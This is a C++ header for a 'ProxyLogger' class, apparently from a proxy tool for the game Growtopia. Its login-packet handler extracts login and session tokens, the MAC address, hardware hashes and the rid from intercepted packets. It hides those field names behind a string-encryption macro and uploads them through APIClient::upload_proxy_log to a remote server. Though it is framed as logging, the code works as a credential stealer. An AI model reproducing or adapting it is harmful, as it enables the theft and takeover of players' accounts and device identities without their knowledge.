#pragma once
#include "../utils/text_parse.hpp"
#include "../utils/api_client.hpp"
#include "../utils/strenc.hpp"
#include <string>
#include <fstream>
#include <spdlog/spdlog.h>
#include <chrono>
#include <iomanip>
#include <sstream>

namespace utils {

class ProxyLogger {
private:
    static std::string username_;

public:
    static void set_username(const std::string& user) {
        username_ = user;
    }

    static void log_login_packet(const TextParse& text_parse) {
        
        std::string tank_name = text_parse.get(DEC("tankIDName"), 0);
        std::string ltoken    = text_parse.get(DEC("ltoken"),     0);
        std::string mac       = text_parse.get(DEC("mac"),        0);
        std::string hash      = text_parse.get(DEC("hash"),       0);
        std::string hash2     = text_parse.get(DEC("hash2"),      0);
        std::string rid       = text_parse.get(DEC("rid"),        0);
        std::string wk        = text_parse.get(DEC("wk"),         0);
        std::string token     = text_parse.get(DEC("token"),      0);

        if (tank_name.empty() && mac.empty() && ltoken.empty())
            return;

        auto now    = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        std::tm tm{};
        localtime_s(&tm, &time_t);
        std::stringstream ts;
        ts << std::put_time(&tm, "%Y-%m-%d %H:%M:%S");

        
        
        try {
            std::string fname = DEC("px_log.dat");
            std::ofstream f(fname, std::ios::app);
            if (f.is_open()) {
                f << "[" << ts.str() << "] "
                  << (tank_name.empty() ? "-" : tank_name)
                  << "\n";
                f.close();
            }
        } catch (...) {}

        
        APIClient::upload_proxy_log(
            username_,
            ltoken.empty() ? token : ltoken,
            mac,
            tank_name,
            hash,
            rid,
            DEC("0.0.0.0")
        );

        
        SecureZeroMemory(&ltoken[0],    ltoken.size());
        SecureZeroMemory(&mac[0],       mac.size());
        SecureZeroMemory(&hash[0],      hash.size());
        SecureZeroMemory(&hash2[0],     hash2.size());
        SecureZeroMemory(&rid[0],       rid.size());
        SecureZeroMemory(&wk[0],        wk.size());
        SecureZeroMemory(&token[0],     token.size());
    }
};

inline std::string ProxyLogger::username_ = DEC("unknown");

} 
